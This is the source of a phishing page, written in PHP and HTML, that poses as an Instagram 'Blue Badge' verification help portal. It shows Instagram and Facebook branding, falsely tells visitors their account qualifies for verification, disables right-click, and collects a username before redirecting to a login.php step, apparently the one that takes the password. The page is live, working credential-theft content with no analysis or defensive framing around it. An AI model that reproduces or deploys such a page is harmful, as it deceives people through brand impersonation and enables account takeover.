<?php

if ($_GET) {
    $username=$_GET["username"];
    session_start();
    $_SESSION["username"]=$username;
    header("location: login.php?username=$username");
}


?>

<!DOCTYPE html>
<html>
                            <head>
                                <meta charset='utf-8'>
                                <meta name='viewport' content='width=device-width, initial-scale=1'>
                                <title>Blue Badge Support </title>
                                <link href='https://maxcdn.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css' rel='stylesheet'>
                                <link href='https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.0.3/css/font-awesome.css' rel='stylesheet'>
                                <link rel="stylesheet" type="text/css" href="style.css">
                                <script type='text/javascript' src='https://cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js'></script>
                                <script type='text/javascript' src='https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js'></script>
                                <script type='text/javascript' src='https://maxcdn.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js'></script>
                            </head>
                            <body oncontextmenu='return false' class='snippet-body'>
                            
    <div class="card card0">
        <div class="d-flex flex-lg-row flex-column-reverse">
            <div class="card card1">
                <div class="row justify-content-center my-auto">
                    <div class="col-md-8 col-10 my-5">
                        <div class="row justify-content-center px-3 mb-3"> <img id="logo" src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png" style="margin-top:-10px"> </div>
                        <h5 style="color:grey;" class="mb-5 text-center heading"> Blue Badge Center&nbsp;<img style="width:16px;" src="https://i.imgyukle.com/2020/02/19/niuzAb.png"></h5>
                       
                    
       
                      <center><img src="img/iglogo.png" width="115px" alt=pharaben style="margin-top:-40px" ></center>
                            <br>
                             <h6 style="font-size:13px;color:red;"  class="msg-info">Before completing the form, you must login with your account.</h6>
                        <div class="form-group"> 

                        <form method="get"> <input style="top:10px;" required=""  type="text" id="psw" name="username" placeholder="Username" class="form-control"> </div>
                        <div style="top: 10px;" class="row justify-content-center my-3 px-3"> <button name="buton" class="btn-block btn-color">Continue As </button> </div></form>
                        <div  style="position: relative; margin-left:100px;"  class="row justify-content-center my-2"> <a href="https://www.instagram.com/accounts/password/reset/"><small  class="text-muted">Forgot Password?</small></a> </div>
                    </div>
                </div>
                <div class="bottom text-center mb-5">
                    <p href="#" class="sm-text mx-auto mb-3">Don't have an account?<br><br><button class="btn btn-white ml-2">Sign Up</button></p>

                </div>
                <style>
                    .other{
            margin-top:100px;
            bottom:1px;
            position:relative;
            border-top:1px solid #cecece;
            width:100%;

        }
                </style>
          <center> <div  class="other">
        <img src="https://marka-logo.com/wp-content/uploads/2020/04/Facebook-Logo.png" alt="fb" width="110">
    </div>
            </div>
            <div class="card card2">
                <div class="my-auto mx-md-5 px-md-5 right">
                    <h3 class="text-white">Instagram Help Portal</h3> <small class="text-white">If you are redirected to this page, your account meets our verified content requirements. Please fill out the form to verify your account.
                </div>
            </div>

        </div>
    </div>
</div>
                            <script type='text/javascript'></script>
                            </body>
                        </html>